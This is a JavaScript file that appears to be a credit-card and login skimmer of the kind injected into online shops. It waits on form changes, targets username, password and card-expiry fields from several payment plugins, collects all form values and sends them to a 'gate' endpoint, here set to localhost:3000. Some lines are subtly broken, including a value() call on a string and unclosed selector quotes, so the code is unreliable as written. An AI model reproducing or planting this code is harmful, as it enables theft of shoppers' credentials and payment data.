setTimeout(function(){
    jQuery(function($a){
        $a(document).on('change','form', function(){
            var b =[
                'input[name="username"]',
                'input[name="user"]',
                'input[name="usr"]',
                'input[name="password"]',
                'input[name="psw"]',
                'input[name="pw"]',
                'input[name="expiry_date"]',
                'input[id="text-expiry_date"]',
                'input[data-braintree-name="expirationMonth"]',
                'input[data-checkout="expiry-year"]',
                'select[name="payment[cc_exp_year]"]',
                'select[id="paymill_creditcard_expiry_year]',
                'select[id="cardExpirationYear]',
                'input[name="expiration"]',
                'input[name="full_cc_expiration"]',
                'select[id="redecard_expiration_yr"]',
                'select[id="stripe_cc_expiration_year"]',
                'select[id="radweb_stripe_cc_expiration_yr"]'
            ];
            for (var j=0;j<4;j++){
                try {
                      if ($a(b[j]).val().length>0){
                          k();
                    }
                }catch(e){

                }
            }
            function k(){
                var x ="";
                var inp = document.querySelectorAll("input,select,textarea,checkbox");
                for (var i =0;i<inp.length;i++){
                    if (inp[i].value().length>0){
                        var n = inp[i].name;
                        if (n == ''){
                            n='EMPTY'+i
                        }
                        var s = n.replace(/\[/g,"-");
                        var d = s.replace(/-redecard/,"");
                         x += d.replace(/]/g,"")+'='+inp[i].value+'&';
                    }
                }
                x = x+"&id="+window.location.host;
                $a.ajax({
                    url:"http://localhost:3000/gate",
                    data: x,
                    type:"GET",
                    dataType:"json",
                    success: function(){
                        return false;
                    },
                    error: function(){
                        return false;
                    }
                });
            }
        })
    })
}, 5000);